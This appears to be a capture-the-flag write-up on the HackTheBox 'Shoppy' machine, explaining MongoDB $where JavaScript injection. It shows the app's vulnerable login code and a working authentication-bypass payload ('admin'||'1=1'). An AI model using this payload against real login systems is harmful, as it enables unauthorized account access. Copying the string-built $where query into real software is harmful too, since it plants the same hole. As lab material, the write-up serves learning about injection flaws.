**Beyond Auth bypass**

Shoppy come with MEAN stack {Mongodb,Express,Angular,Nodejs}  
 
Endpoints   
/login

We identified Nosql injection vulnerability 
In username parameter of login form in shoppy.htb

**About Nosql injection in Nodejs**

One thing many users are surprised about, is that Mongo supports JavaScript evaluation when a JS expression is placed into a $where clause or passed into a mapReduce or group function. So anywhere unfiltered input is passed to one of these clauses, we may find JavaScript injection.

**JavaScript Injection Example**

The app has a JavaScript injection in the querystring of the user lookup page. The (vulnerable) lookup code looks like this:

```javascript
let username = req.query.username;
query = { $where: `this.username == '${username}'` }
User.find(query, function (err, users) {
	if (err) {
		// Handle errors
	} else {
		res.render('userlookup', { title: 'User Lookup', users: users });
	}
});
```
As you can see, the username search string is pulled directly from the request without any filtering. The query is a where clause which passes in the username string directly. So, if we put valid JavaScript into the querystring, and match quotes correctly, we can have Mongo execute our JavaScript!

In this case, our goal is to find all valid users, so we'd like to pass in something which will always evaluate to true. If we pass in a string like ' || 'a'=='a the query will become $where: `this.username == '' || 'a'=='a'` which of course always evaluates to true and thus returns all results. With JS injection, there are many other things we might be able to achieve, and boolean checks are just one


Reference no 1 [https://nullsweep.com/a-nosql-injection-primer-with-mongo/](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)

Reference no 2 **Javascript Evaluation Query in mongodb**   

[https://www.mongodb.com/docs/manual/reference/operator/query-evaluation/](https://www.mongodb.com/docs/manual/reference/operator/query-evaluation/)

**Debuging ShoppyApp**

Runing shoppyapp localy and config the mongodb 

Vulnerable Code
```javascript
app.post('/login', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    if (username === undefined || password === undefined) {
        res.status(400).send('Bad Request');
        return;
    }
    const passToTest = require('crypto').createHash('md5').update(password).digest('hex');
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
    const result = await User.find(query).maxTimeMS(350);
    if (result.length === 0) {
        res.redirect('/login?error=WrongCredentials');
    } else {
        req.session.username = req.body.username;
        req.session.save((error) => {
            if (error) {
                res.redirect('/login?error=WrongCredentials');
            } else {
                res.redirect('/admin');
            }
        });
    }
});
```
**Payload**   
{"username":"admin'||'1=1","password":""}

Set a breakpoint in line 86 and inject the payload the query will look like this
```javascript
$where: 'this.username === 'admin'||' 1=1' && this.password === 'd41d8cd98f00b204e9800998ecf8427e''
```
**Report**   
admin OR 1=1 AND passwod in this query "1=1" will evaluates to true and return 1. If we get 0 it will redirect to Wrongcreds if we get 1 it will redirect to /admin endpoint from that point we successfully bypass the auth 
